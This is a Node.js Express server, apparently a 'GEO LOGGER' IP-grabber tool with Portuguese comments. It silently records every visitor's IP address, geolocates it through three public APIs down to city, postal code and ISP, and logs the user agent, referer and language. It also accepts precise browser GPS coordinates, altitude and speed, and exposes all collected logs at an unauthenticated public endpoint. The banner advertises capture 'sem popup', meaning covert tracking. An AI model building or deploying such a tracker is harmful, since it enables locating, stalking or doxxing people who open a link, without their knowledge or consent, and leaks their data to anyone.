const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'data', 'log.json');

app.use(express.json());
app.use(express.static('public'));

if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}
if (!fs.existsSync(LOG_FILE)) {
    fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// =============================================
//  Busca localização pelo IP — 3 APIs de fallback
// =============================================
async function getLocationByIP(ip) {
    let cleanIP = ip.replace('::ffff:', '').replace('::1', '').replace('127.0.0.1', '');

    // Se for IP local/privado, retorna só o IP
    if (!cleanIP || cleanIP.startsWith('10.') || cleanIP.startsWith('192.168.') || cleanIP.startsWith('172.')) {
        return { ip: ip, erro: 'IP local/privado' };
    }

    // TENTATIVA 1: ipapi.co (grátis, 1000/dia)
    try {
        const res = await fetch(`https://ipapi.co/${cleanIP}/json/`, {
            headers: { 'User-Agent': 'geo-logger/2.0' }
        });
        const data = await res.json();
        if (data.latitude) {
            return {
                ip: data.ip || cleanIP,
                latitude: data.latitude,
                longitude: data.longitude,
                cidade: data.city,
                estado: data.region,
                pais: data.country_name,
                cep: data.postal,
                fuso_horario: data.timezone,
                provedor: data.org,
                google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            };
        }
    } catch (e) {
        console.log('[API 1] ipapi.co falhou:', e.message);
    }

    // TENTATIVA 2: ip-api.com (grátis, sem limite, só HTTP)
    try {
        const res = await fetch(`http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,query&lang=pt`);
        const data = await res.json();
        if (data.status === 'success') {
            return {
                ip: data.query,
                latitude: data.lat,
                longitude: data.lon,
                cidade: data.city,
                estado: data.regionName,
                pais: data.country,
                cep: data.zip,
                fuso_horario: data.timezone,
                provedor: data.isp,
                google_maps: `https://www.google.com/maps?q=${data.lat},${data.lon}`
            };
        }
    } catch (e) {
        console.log('[API 2] ip-api.com falhou:', e.message);
    }

    // TENTATIVA 3: ipwho.is (grátis, sem limite)
    try {
        const res = await fetch(`https://ipwho.is/${cleanIP}`);
        const data = await res.json();
        if (data.success) {
            return {
                ip: data.ip,
                latitude: data.latitude,
                longitude: data.longitude,
                cidade: data.city,
                estado: data.region,
                pais: data.country,
                cep: data.postal,
                fuso_horario: data.timezone?.id,
                provedor: data.connection?.isp,
                google_maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            };
        }
    } catch (e) {
        console.log('[API 3] ipwho.is falhou:', e.message);
    }

    return { ip: cleanIP, erro: 'Todas as APIs falharam' };
}

// =============================================
//  CAPTURA AUTOMÁTICA — Toda visita é logada
// =============================================
app.use(async (req, res, next) => {
    if (req.path === '/' && req.method === 'GET') {
        try {
            const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
            console.log(`[VISITA] IP detectado: ${ip}`);

            const location = await getLocationByIP(ip);

            const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));

            const entry = {
                id: logs.length + 1,
                ...location,
                user_agent: req.headers['user-agent'],
                referer: req.headers['referer'] || null,
                idioma: req.headers['accept-language']?.split(',')[0] || null,
                timestamp: new Date().toISOString()
            };

            logs.push(entry);
            fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
            console.log(`[LOG #${entry.id}] ${entry.cidade || 'Desconhecido'} - ${entry.ip}`);
        } catch (err) {
            console.error('[ERRO] Falha ao logar visita:', err);
        }
    }
    next();
});

// =============================================
//  POST /api/log — GPS extra (mais preciso)
// =============================================
app.post('/api/log', (req, res) => {
    try {
        const { latitude, longitude, accuracy, altitude, speed } = req.body;
        if (latitude === undefined || longitude === undefined) {
            return res.status(400).json({ error: 'Latitude e longitude obrigatórios' });
        }

        const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));

        const lastLog = logs[logs.length - 1];
        if (lastLog && !lastLog.gps_latitude) {
            lastLog.gps_latitude = latitude;
            lastLog.gps_longitude = longitude;
            lastLog.gps_precisao = accuracy;
            lastLog.gps_altitude = altitude;
            lastLog.gps_velocidade = speed;
            lastLog.google_maps_gps = `https://www.google.com/maps?q=${latitude},${longitude}`;
            fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
            console.log(`[GPS] Log #${lastLog.id} atualizado com GPS preciso`);
        }

        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Erro interno' });
    }
});

// =============================================
//  GET /log.json
// =============================================
app.get('/log.json', (req, res) => {
    try {
        const logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        res.json(logs);
    } catch (err) {
        res.json([]);
    }
});

// =============================================
//  GET /log — Painel visual
// =============================================
app.get('/log', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'log.html'));
});

// =============================================
//  DELETE /api/log — Limpar logs
// =============================================
app.delete('/api/log', (req, res) => {
    fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`
  ┌──────────────────────────────────────────────┐
  │   GEO LOGGER v2.1 — porta ${PORT}                │
  │                                              │
  │   Página:  http://localhost:${PORT}               │
  │   Painel:  http://localhost:${PORT}/log           │
  │   JSON:    http://localhost:${PORT}/log.json      │
  │                                              │
  │   ✓ 3 APIs de fallback (ipapi, ip-api, ipwho)│
  │   ✓ Captura por IP (automática, sem popup)   │
  │   ✓ Captura por GPS (se permitir, + preciso) │
  └──────────────────────────────────────────────┘
    `);
});
